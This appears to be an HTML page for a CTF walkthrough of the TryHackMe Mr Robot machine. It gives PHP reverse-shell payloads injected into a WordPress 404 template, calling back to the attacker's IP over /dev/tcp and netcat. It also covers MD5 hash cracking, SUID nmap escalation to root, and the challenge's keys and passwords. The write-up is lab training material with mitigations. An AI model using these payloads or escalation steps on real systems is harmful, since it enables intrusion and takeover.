@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mr Robot CTF Walkthrough</title>
+  <link rel="stylesheet" href="../assets/style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <meta name="description" content="Complete walkthrough of the TryHackMe Mr Robot CTF featuring WordPress exploitation, reverse shells, hash cracking, and privilege escalation via SUID binaries.">
+  <meta name="keywords" content="mr robot, tryhackme, wordpress, reverse shell, hash cracking, privilege escalation, SUID, nmap, CTF">
+  <meta name="author" content="Justin Van Den Hurk">
+</head>
+<body>
+  <div class="container">
+    <header>
+      <a href="../" class="back-link">Back to Writeups</a>
+      
+      <h1>Mr Robot CTF Walkthrough</h1>
+      <p class="subtitle">WordPress Exploitation Challenge</p>
+      
+      <div class="challenge-info">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+          <span class="text-muted">Published: September 26, 2025</span>
+          <span class="text-muted">Difficulty: Medium</span>
+        </div>
+        <p>Mr Robot CTF is a themed challenge on <a href="https://tryhackme.com/room/mrrobot" target="_blank" rel="noopener noreferrer">TryHackMe</a> based on the popular TV series. This machine focuses on WordPress exploitation, reverse shell techniques, hash cracking, and privilege escalation using SUID binaries to find three hidden keys.</p>
+      </div>
+    </header>
+
+    <nav id="pre-security-nav">
+      <ul class="section-nav">
+        <li><a href="#reconnaissance">Reconnaissance</a></li>
+        <li><a href="#web-exploitation">Web Exploitation</a></li>
+        <li><a href="#reverse-shell">Reverse Shell</a></li>
+        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+        <li><a href="#root-access">Root Access</a></li>
+      </ul>
+    </nav>
+
+    <main>
+      <article>
+        <section id="reconnaissance">
+          <h2>Reconnaissance Phase</h2>
+          
+          <div class="level-solution">
+            <h3>Network Scanning</h3>
+            <p><strong>Objective:</strong> Discover open ports and running services on the target machine.</p>
+            
+            <p>Start with a comprehensive Nmap scan:</p>
+            <pre><code>nmap -sC -sV -oN initial_scan.txt &lt;TARGET_IP&gt;</code></pre>
+            
+            <p>The scan reveals the following ports:</p>
+            <ul>
+              <li><strong>Port 22 (SSH):</strong> Closed</li>
+              <li><strong>Port 80 (HTTP):</strong> Closed (but actually filtered/accessible)</li>
+              <li><strong>Port 443 (HTTPS):</strong> Closed</li>
+            </ul>
+            
+            <p>Despite showing as closed, the web service is actually accessible. This can occur due to firewall rules or service configuration.</p>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Nmap results can sometimes be misleading due to firewall configurations. Always test web services manually even if they appear closed in initial scans.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Directory Enumeration</h3>
+            <p><strong>Objective:</strong> Discover hidden directories and files using automated tools.</p>
+            
+            <p>Use Gobuster to enumerate web directories:</p>
+            <pre><code>gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
+            
+            <p>Key discoveries include:</p>
+            <ul>
+              <li><code>/wp-content/</code> - WordPress content directory</li>
+              <li><code>/wp-admin/</code> - WordPress admin panel</li>
+              <li><code>/wp-login.php</code> - WordPress login page</li>
+              <li><code>/robots</code> - Robots.txt file</li>
+              <li><code>/license</code> - License file with hidden content</li>
+              <li><code>/readme</code> - Readme file</li>
+              <li><code>/0/</code> - Mysterious directory</li>
+            </ul>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>The presence of WordPress-related directories indicates this is a WordPress site, which has known attack vectors and common vulnerabilities.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Information Gathering from Key Files</h3>
+            <p><strong>Objective:</strong> Extract valuable information from discovered files.</p>
+            
+            <p><strong>Robots.txt Analysis:</strong></p>
+            <p>Navigate to <code>http://&lt;TARGET_IP&gt;/robots</code> to find:</p>
+            <pre><code>User-agent: *
+fsocity.dic
+key-1-of-3.txt</code></pre>
+            
+            <p>Access the first key at <code>http://&lt;TARGET_IP&gt;/key-1-of-3.txt</code>:</p>
+            
+            <div class="flag-container">
+              <strong>🚩 Key 1: 073403c8a58a1f80d943455fb30724b9</strong>
+            </div>
+            
+            <p><strong>License File Investigation:</strong></p>
+            <p>Navigate to <code>http://&lt;TARGET_IP&gt;/license</code> and scroll down to find a Base64 encoded string:</p>
+            <pre><code>ZWxsaW90OkVSMjgtMDY1Mgo=</code></pre>
+            
+            <p>Decode the Base64 string:</p>
+            <pre><code>echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d</code></pre>
+            
+            <p>Result:</p>
+            <div class="flag-container">
+              <strong>Username: elliot</strong><br>
+              <strong>Password: ER28-0652</strong>
+            </div>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Always check robots.txt and license files for hidden information. Base64 encoding is commonly used to obfuscate credentials in CTF challenges.</p>
+          </div>
+        </section>
+
+        <section id="web-exploitation">
+          <h2>Web Exploitation</h2>
+          
+          <div class="level-solution">
+            <h3>WordPress Authentication</h3>
+            <p><strong>Objective:</strong> Gain access to the WordPress admin panel using discovered credentials.</p>
+            
+            <p>Navigate to <code>http://&lt;TARGET_IP&gt;/wp-login.php</code> and log in with:</p>
+            <ul>
+              <li><strong>Username:</strong> elliot</li>
+              <li><strong>Password:</strong> ER28-0652</li>
+            </ul>
+            
+            <p>Upon successful authentication, you'll have access to the WordPress admin dashboard with editor privileges.</p>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>WordPress admin access provides numerous attack vectors, including the ability to edit PHP files directly through the theme editor.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>PHP Code Injection Preparation</h3>
+            <p><strong>Objective:</strong> Identify a suitable location for PHP reverse shell injection.</p>
+            
+            <p>Navigate to <strong>Appearance → Editor</strong> in the WordPress admin panel. Look for PHP template files that can be edited, such as:</p>
+            <ul>
+              <li>404.php (404 error template)</li>
+              <li>index.php (main template)</li>
+              <li>functions.php (theme functions)</li>
+            </ul>
+            
+            <p>The 404.php template is ideal because:</p>
+            <ul>
+              <li>It's easily accessible via invalid URLs</li>
+              <li>Less likely to break the main site functionality</li>
+              <li>Commonly targeted in WordPress exploitation</li>
+            </ul>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>WordPress theme editor allows direct PHP code modification, making it a prime target for code injection attacks when admin access is compromised.</p>
+          </div>
+        </section>
+
+        <section id="reverse-shell">
+          <h2>Reverse Shell Establishment</h2>
+          
+          <div class="level-solution">
+            <h3>Netcat Listener Setup</h3>
+            <p><strong>Objective:</strong> Prepare to receive the reverse shell connection.</p>
+            
+            <p>Set up a Netcat listener on your attacking machine:</p>
+            <pre><code>nc -lvnp 4444</code></pre>
+            
+            <p>Explanation of flags:</p>
+            <ul>
+              <li><code>-l</code>: Listen mode</li>
+              <li><code>-v</code>: Verbose output</li>
+              <li><code>-n</code>: Don't resolve hostnames</li>
+              <li><code>-p 4444</code>: Listen on port 4444</li>
+            </ul>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Always set up your listener before executing the reverse shell payload to avoid missing the connection.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>PHP Reverse Shell Injection</h3>
+            <p><strong>Objective:</strong> Inject PHP code to establish a reverse shell connection.</p>
+            
+            <p>Add the following PHP reverse shell code to the 404.php template (above existing PHP code):</p>
+            <pre><code>&lt;?php
+exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/[YOUR_IP]/4444 0&gt;&amp;1'");
+?&gt;</code></pre>
+            
+            <p>Replace <code>[YOUR_IP]</code> with your attacking machine's IP address.</p>
+            
+            <p><strong>Alternative PHP Reverse Shell:</strong></p>
+            <pre><code>&lt;?php
+system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [YOUR_IP] 4444 &gt;/tmp/f");
+?&gt;</code></pre>
+            
+            <p>Save the modified template file.</p>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>PHP's exec() and system() functions can execute system commands, making them powerful tools for establishing reverse shells.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Triggering the Reverse Shell</h3>
+            <p><strong>Objective:</strong> Execute the injected PHP code to establish the connection.</p>
+            
+            <p>Navigate to a non-existent page to trigger the 404.php template:</p>
+            <pre><code>http://&lt;TARGET_IP&gt;/404.php</code></pre>
+            
+            <p>Or try accessing any invalid URL:</p>
+            <pre><code>http://&lt;TARGET_IP&gt;/nonexistent</code></pre>
+            
+            <p>Check your Netcat listener for the incoming connection. You should receive a shell as the <code>daemon</code> or <code>www-data</code> user.</p>
+            
+            <p><strong>Shell Improvement:</strong></p>
+            <p>Upgrade to a more stable shell:</p>
+            <pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Reverse shells often provide limited functionality initially. Use Python's pty module to spawn a proper terminal for better interaction.</p>
+          </div>
+        </section>
+
+        <section id="privilege-escalation">
+          <h2>Privilege Escalation</h2>
+          
+          <div class="level-solution">
+            <h3>System Reconnaissance</h3>
+            <p><strong>Objective:</strong> Explore the system to find the second key and escalation paths.</p>
+            
+            <p>Navigate to the home directory:</p>
+            <pre><code>cd /home
+ls -la</code></pre>
+            
+            <p>Discover the <code>robot</code> user directory:</p>
+            <pre><code>cd /home/robot
+ls -la</code></pre>
+            
+            <p>You'll find two files:</p>
+            <ul>
+              <li><code>key-2-of-3.txt</code> - The second key (readable only by robot user)</li>
+              <li><code>password.raw-md5</code> - MD5 hash of robot's password</li>
+            </ul>
+            
+            <p>Read the MD5 hash file:</p>
+            <pre><code>cat password.raw-md5</code></pre>
+            
+            <p>Result: <code>robot:c3fcd3d76192e4007dfb496cca67e13b</code></p>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Look for password files, especially those containing hashes that can be cracked offline.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Hash Cracking</h3>
+            <p><strong>Objective:</strong> Crack the MD5 hash to obtain the robot user's password.</p>
+            
+            <p>Use online hash cracking services like <a href="https://crackstation.net" target="_blank" rel="noopener noreferrer">CrackStation</a> or local tools:</p>
+            
+            <p><strong>Online Method:</strong></p>
+            <ol>
+              <li>Visit CrackStation.net</li>
+              <li>Enter hash: <code>c3fcd3d76192e4007dfb496cca67e13b</code></li>
+              <li>Result: <code>abcdefghijklmnopqrstuvwxyz</code></li>
+            </ol>
+            
+            <p><strong>Local Method with John the Ripper:</strong></p>
+            <pre><code>echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
+john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></pre>
+            
+            <div class="flag-container">
+              <strong>Robot Password: abcdefghijklmnopqrstuvwxyz</strong>
+            </div>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>MD5 hashes of common passwords are easily cracked using rainbow tables and common wordlists. Always use strong, unique passwords and proper hashing algorithms.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>User Privilege Escalation</h3>
+            <p><strong>Objective:</strong> Switch to the robot user and retrieve the second key.</p>
+            
+            <p>Switch to the robot user:</p>
+            <pre><code>su robot</code></pre>
+            
+            <p>Enter the cracked password: <code>abcdefghijklmnopqrstuvwxyz</code></p>
+            
+            <p>Read the second key:</p>
+            <pre><code>cat key-2-of-3.txt</code></pre>
+            
+            <div class="flag-container">
+              <strong>🚩 Key 2: 822c73956184f694993bede3eb39f959</strong>
+            </div>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Lateral movement to different user accounts often provides access to additional files and escalation opportunities.</p>
+          </div>
+        </section>
+
+        <section id="root-access">
+          <h2>Root Access and Final Key</h2>
+          
+          <div class="level-solution">
+            <h3>SUID Binary Discovery</h3>
+            <p><strong>Objective:</strong> Find SUID binaries that can be exploited for root access.</p>
+            
+            <p>Search for SUID binaries:</p>
+            <pre><code>find / -perm -4000 2>/dev/null</code></pre>
+            
+            <p>Notable results include:</p>
+            <pre><code>/bin/umount
+/bin/mount
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1</code></pre>
+            
+            <p>The key finding is <code>/usr/local/bin/nmap</code> with SUID permissions.</p>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>SUID binaries run with elevated privileges. Unusual binaries like nmap with SUID permissions often indicate privilege escalation opportunities.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Nmap Interactive Mode Exploitation</h3>
+            <p><strong>Objective:</strong> Exploit nmap's interactive mode to gain root shell access.</p>
+            
+            <p>Older versions of nmap include an interactive mode that can spawn a shell. Execute:</p>
+            <pre><code>/usr/local/bin/nmap --interactive</code></pre>
+            
+            <p>This drops you into nmap's interactive mode. From here, you can execute system commands:</p>
+            <pre><code>nmap> !bash</code></pre>
+            
+            <p>Alternatively:</p>
+            <pre><code>nmap> !sh</code></pre>
+            
+            <p>You should now have a root shell. Verify with:</p>
+            <pre><code>whoami
+id</code></pre>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Interactive modes in SUID binaries can often be exploited to execute arbitrary commands with elevated privileges. Check GTFOBins for known exploitation techniques.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Final Key Retrieval</h3>
+            <p><strong>Objective:</strong> Locate and retrieve the third and final key.</p>
+            
+            <p>Search for the final key:</p>
+            <pre><code>find / -name 'key-3-of-3.txt' 2>/dev/null</code></pre>
+            
+            <p>Result: <code>/root/key-3-of-3.txt</code></p>
+            
+            <p>Read the final key:</p>
+            <pre><code>cat /root/key-3-of-3.txt</code></pre>
+            
+            <div class="flag-container">
+              <strong>🚩 Key 3: 04787ddef27c3dee1ee161b21670b4e4</strong>
+            </div>
+            
+            <p><strong>Additional Root Actions:</strong></p>
+            <p>With root access, you can also:</p>
+            <ul>
+              <li>Read all user passwords: <code>cat /etc/shadow</code></li>
+              <li>Access SSH keys: <code>ls -la /root/.ssh/</code></li>
+              <li>View system logs: <code>cat /var/log/auth.log</code></li>
+              <li>Install persistence mechanisms</li>
+            </ul>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Root access provides complete control over the system. In real penetration tests, this would be the point to document findings and implement persistence if authorized.</p>
+          </div>
+        </section>
+
+        <section id="summary">
+          <h2>Challenge Summary</h2>
+          
+          <div class="level-solution">
+            <h3>Complete Attack Chain</h3>
+            <p><strong>Full Exploitation Path:</strong></p>
+            
+            <ol>
+              <li><strong>Reconnaissance:</strong> Directory enumeration revealed WordPress installation</li>
+              <li><strong>Information Disclosure:</strong> robots.txt exposed first key and dictionary file</li>
+              <li><strong>Credential Discovery:</strong> Base64 encoded credentials in license file</li>
+              <li><strong>WordPress Compromise:</strong> Admin access through weak credentials</li>
+              <li><strong>Code Injection:</strong> PHP reverse shell via theme editor</li>
+              <li><strong>Lateral Movement:</strong> Hash cracking enabled user escalation</li>
+              <li><strong>Privilege Escalation:</strong> SUID nmap exploitation for root access</li>
+            </ol>
+            
+            <p><strong>All Three Keys:</strong></p>
+            <div class="flag-container">
+              <strong>Key 1: 073403c8a58a1f80d943455fb30724b9</strong><br>
+              <strong>Key 2: 822c73956184f694993bede3eb39f959</strong><br>
+              <strong>Key 3: 04787ddef27c3dee1ee161b21670b4e4</strong>
+            </div>
+            
+            <p><strong>Technical Skills Demonstrated:</strong></p>
+            <ul>
+              <li>Network reconnaissance and service enumeration</li>
+              <li>WordPress security testing and exploitation</li>
+              <li>PHP code injection and reverse shell techniques</li>
+              <li>Hash cracking and password analysis</li>
+              <li>SUID binary exploitation</li>
+              <li>Linux privilege escalation techniques</li>
+              <li>System enumeration and file discovery</li>
+            </ul>
+            
+            <p><strong>Vulnerabilities Identified:</strong></p>
+            <ul>
+              <li><strong>Information Disclosure:</strong> Sensitive data in publicly accessible files</li>
+              <li><strong>Weak Authentication:</strong> Predictable credentials</li>
+              <li><strong>WordPress Misconfigurations:</strong> Unrestricted theme editor access</li>
+              <li><strong>Weak Password Hashing:</strong> MD5 without salting</li>
+              <li><strong>SUID Misconfiguration:</strong> Unnecessary elevated privileges on nmap</li>
+            </ul>
+            
+            <p><strong>Mitigation Recommendations:</strong></p>
+            <ul>
+              <li>Remove sensitive information from public files</li>
+              <li>Implement strong, unique passwords with proper hashing</li>
+              <li>Disable WordPress file editing for admin users</li>
+              <li>Regular security updates and patch management</li>
+              <li>Audit SUID binaries and remove unnecessary permissions</li>
+              <li>Implement proper access controls and principle of least privilege</li>
+            </ul>
+          </div>
+        </section>
+      </article>
+      
+    </main>
+
+    <footer>
+      <p>
+        Created by <a href="https://www.linkedin.com/in/justin-tom-van-den-hurk/" target="_blank" rel="noopener noreferrer">Justin Van Den Hurk</a>
+        • 
+        <a href="https://github.com/jvandenhurk" target="_blank" rel="noopener noreferrer">View on GitHub</a>
+      </p>
+      <p class="text-muted">Last updated: September 2025</p>
+      <a class="backtotop" href="#">Back to top</a>
+    </footer>
+  </div>
+</body>
+</html>
